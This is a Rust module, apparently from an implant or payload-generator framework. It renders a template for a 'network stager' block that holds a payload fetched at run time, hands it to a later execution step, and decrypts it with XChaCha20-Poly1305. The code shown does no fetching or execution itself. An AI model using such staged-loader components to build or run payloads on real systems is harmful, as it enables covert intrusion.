//! The network-stager shared block (`$STAGER_BLOCK$`).
//!
//! A `network_stager` step fetches a payload at run time and hands it to the next
//! Execution step. This module renders the process-global slot the two share, plus
//! the staged decryption (which, unlike [`super::steps`]' `decrypt_step`, does not
//! check a plaintext length the build never knew).

/// Renders `$STAGER_BLOCK$`: the staged-payload slot, its accessors and the
/// staged decryption. Emitted only when a step uses `network_stager`.
pub fn render_block() -> String {
    STAGER_BLOCK.to_string()
}

const STAGER_BLOCK: &str = r#"// --- Network stager shared helpers (staged-payload slot) ---
static STAGED: std::sync::Mutex<Option<Vec<u8>>> = std::sync::Mutex::new(None);

/// Stores the fetched payload for the next Execution step.
#[allow(dead_code)]
pub fn store_staged_payload(bytes: Vec<u8>) -> Result<(), String> {
    let mut slot = STAGED
        .lock()
        .map_err(|_| "the staged slot is poisoned".to_string())?;
    if slot.is_some() {
        return Err("a payload is already staged".to_string());
    }
    *slot = Some(bytes);
    Ok(())
}

/// Takes the staged payload (consuming it), failing when none was staged.
#[allow(dead_code)]
pub fn take_staged_payload() -> Result<Vec<u8>, String> {
    STAGED
        .lock()
        .map_err(|_| "the staged slot is poisoned".to_string())?
        .take()
        .ok_or_else(|| "no staged payload: run the fetch step first".to_string())
}

/// Decrypts a staged payload. No plaintext-length check: the size is not known
/// at build time for a payload fetched at run time.
#[allow(dead_code)]
fn decrypt_staged(enc: &[u8], nonce_hex: &str, key_hex: &str) -> Result<Vec<u8>, String> {
    let nonce_vec = hex::decode(nonce_hex).map_err(|e| format!("invalid nonce: {e}"))?;
    let nonce: [u8; 24] = nonce_vec
        .try_into()
        .map_err(|_| "the nonce must be 24 bytes".to_string())?;
    let key_vec = hex::decode(key_hex).map_err(|e| format!("invalid key: {e}"))?;
    let key: [u8; 32] = key_vec
        .try_into()
        .map_err(|_| "the key must be 32 bytes".to_string())?;
    let cipher = XChaCha20Poly1305::new(Key::from_slice(&key));
    cipher
        .decrypt(XNonce::from_slice(&nonce), enc)
        .map_err(|_| "staged payload decryption failed".to_string())
}
"#;
